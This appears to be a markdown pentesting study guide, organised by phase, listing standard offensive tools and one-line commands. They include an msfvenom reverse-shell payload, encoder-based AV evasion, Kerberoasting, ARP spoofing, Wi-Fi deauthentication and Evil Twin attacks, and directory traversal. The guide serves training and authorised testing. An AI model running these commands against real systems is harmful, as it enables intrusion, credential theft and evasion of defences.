# 🛡️ Complete Ethical Hacking & Web App Pentesting Guide

No time constraints now — this version offers full explanations, advanced examples, and complete tooling.

---

## ⚙️ PHASE 1: Setup & Mindset

### ✅ Essential Tools
- **OS**: Kali Linux or Parrot OS (preloaded with hacking tools)
- **Browser**: Firefox + HackBar, FoxyProxy (for manual testing)
- **Proxy**: [Burp Suite](https://portswigger.net/burp) (manual proxy-based testing)
- **Recon**: `nmap`, `ffuf`, `subfinder`, `httpx` (host discovery and directory fuzzing)
- **Exploitation**: `sqlmap`, `XSStrike`, `wfuzz` (automation tools)
- **Practice Labs**: HackTheBox, TryHackMe, PortSwigger Labs

### 🧠 Mindset Tips
- Think adversarially — “What would an attacker do?”
- Focus on chaining small bugs for big results
- Take notes for everything (loot, endpoints, tokens, headers)

---

## 🔍 PHASE 2: Footprinting & Reconnaissance

### 🔎 Passive Recon (No interaction)
- `whois domain.com`
- Google Dorks:
  ```
  site:target.com intitle:index.of
  site:target.com inurl:admin
  ```
- Netcraft, Shodan.io for open ports and services

### ⚡ Active Recon (Interaction-based)
```bash
nmap -sC -sV -A target.com
subfinder -d target.com | httpx
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Use Burp Suite's **Spider**, **Target**, and **Repeater** tabs to map the application.

---

## 🕳️ PHASE 3: Vulnerability Analysis

### 🛠 Tools
- `nikto` – scan for outdated software and common misconfigs
- `nuclei` – templated vulnerability scanner
- `wpscan` – WordPress-specific testing

### 🔬 Manual Analysis
- Look for verbose error messages
- Test every parameter with `'`, `<script>`, `../`
- Observe headers, cookies, CSPs

---

## 💣 PHASE 4: System Hacking & Privilege Escalation

### 🔐 Linux PrivEsc (Post-exploitation)
- Look for SUID binaries:
```bash
find / -perm -4000 -type f 2>/dev/null
```
- Run `linpeas.sh` or `pspy64` for automated discovery
- Check sudo privileges:
```bash
sudo -l
```
- Exploit PATH hijacking or writable scripts by root

### 🪟 Windows PrivEsc
- Run `winPEAS.exe`
- Look for unquoted service paths:
```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows"
```
- AlwaysInstallElevated trick:
```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
If `1`, you can escalate via MSI payloads.

---

## 🏢 PHASE 5: Active Directory Hacking

### 🧠 Key Concepts
- Everything is about **users, groups, ACLs, and delegation**
- BloodHound + SharpHound = AD map

### 🔥 Common Attacks
- **Kerberoasting**:
```bash
GetUserSPNs.py domain/user:pass -dc-ip <IP> -outputfile hashes.txt
hashcat -m 13100 hashes.txt wordlist.txt
```
- **AS-REP Roasting** – when `Do not require pre-auth` is enabled
- **DCSync** – abuse `Replicate Directory Changes` permission

Use `mimikatz`, `crackmapexec`, and `impacket` tools for exploitation

---

## ☠️ PHASE 6: Malware Threats

### 📦 Types
- Keyloggers, Backdoors, Trojans
- Rootkits (kernel-level persistence)
- Ransomware (file encryption + extortion)

### 🛠 Tools
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > evil.exe
```
Obfuscate with `veil` or `obfuscator.io`

---

## 🌐 PHASE 7: Network Sniffing & Session Hijacking

### 🧰 Tools
- `Wireshark`, `tcpdump`, `dsniff`, `ettercap`

### 🧪 Example (ARP Spoofing)
```bash
arpspoof -t victimIP gatewayIP
```
Capture session cookies and reuse in Burp for hijacking

---

## 🎭 PHASE 8: Social Engineering

### ⚔️ Techniques
- Phishing (email + payload)
- Pretexting (impersonation)
- Vishing (voice phishing)

Use `setoolkit` to create fake login pages or payload delivery sites.

---

## 🕵️ PHASE 9: Evading IDS, Firewalls & Honeypots

### 🧠 Strategies
- Obfuscate payloads:
```bash
msfvenom -p payload -e x86/shikata_ga_nai -i 5 -f exe > evasive.exe
```
- Encode payloads in Base64 or Hex
- Time-based evasion: `--delay` in `sqlmap`, throttling `ffuf`
- Use randomized headers or fragment requests

---

## 🔥 PHASE 10: Web Server & Web App Hacking (Advanced)

### Web Server Attacks
- `TRACE`/`PUT` methods
- Misconfigured file uploads:
  - Upload `.php` file with image extension
- Directory traversal: `../../etc/passwd`

### Web App Attacks
- **SQLi**, **XSS**, **CSRF**, **SSRF**, **IDOR**, **Open Redirect**
- Test each input manually and with tools
- Exploit chaining is key:
  - SSRF → internal service → RCE
  - IDOR → account takeover

---

## 📶 PHASE 11: Wireless Network Hacking

### 🧰 Tools
```bash
airmon-ng start wlan0
airodump-ng wlan0mon
aireplay-ng --deauth 10 -a BSSID wlan0mon
```
- Capture handshake
- Crack with `aircrack-ng` or `hashcat`

### 🤖 Automated WiFi Hacking
- Use `wifite` (automates capture, cracking, and targeting)
```bash
wifite
```
- Use `fluxion` for Evil Twin attacks (host fake access point, steal creds)

### 🔧 Manual Steps Summary
1. **Monitor Mode**:
   ```bash
   airmon-ng start wlan0
   ```
2. **Capture Handshake**:
   ```bash
   airodump-ng wlan0mon
   aireplay-ng -0 10 -a <BSSID> wlan0mon
   ```
3. **Crack Handshake**:
   ```bash
   aircrack-ng capture.cap -w rockyou.txt
   ```

---

## 📱 PHASE 12: Mobile Hacking

### Android
- Reverse APKs:
```bash
apktool d app.apk
jadx-gui app.apk
```
- Look for hardcoded secrets, exposed endpoints

### iOS
- Requires jailbroken device/emulator
- Use `Frida` + `Objection` for runtime hooking

---

## 🧠 PHASE 13: IoT & OT Hacking

### 🛠 Tools
- `shodan` to find public-facing interfaces
- `binwalk` to extract firmware
- `firmwalker`, `strings`, `ghidra` to analyze firmware binaries

---

## ☁️ PHASE 14: Cloud Hacking

### AWS Example:
```bash
aws s3 ls s3://bucket-name --no-sign-request
```
- Use `ScoutSuite`, `Pacu`, `CloudSploit`
- Misconfigs to look for:
  - Open S3 buckets
  - Overly permissive IAM roles
  - Public Lambda/EC2/Secrets

---

## 🔐 PHASE 15: Cryptography Attacks

### 🔍 Common Flaws
- Use of ECB mode (detectable via patterns)
- Poor key generation (hardcoded, reused)
- Predictable randomness

### 🛠 Cracking Hashes
```bash
hashcat -m 0 hashes.txt rockyou.txt
```

---

## ✅ Reporting Template
```markdown
# [Vulnerability Title]
**Target:** https://target.com/page  
**Severity:** High

---

## 📖 Description
Explain clearly.

---

## ✅ Steps to Reproduce
1. Input this
2. Observe this

---

## 💥 Impact
Explain potential damage.

---

## 🛠 Recommended Fix
- Patch suggestion
```

---

## ⚠️ Final Advice
- Think like a curious attacker
- Automate recon, manual exploit
- Always try to **chain attacks**
- Practice in **realistic CTF labs**
- Stay **legal**. Stay **ethical**. Stay **relentless**.

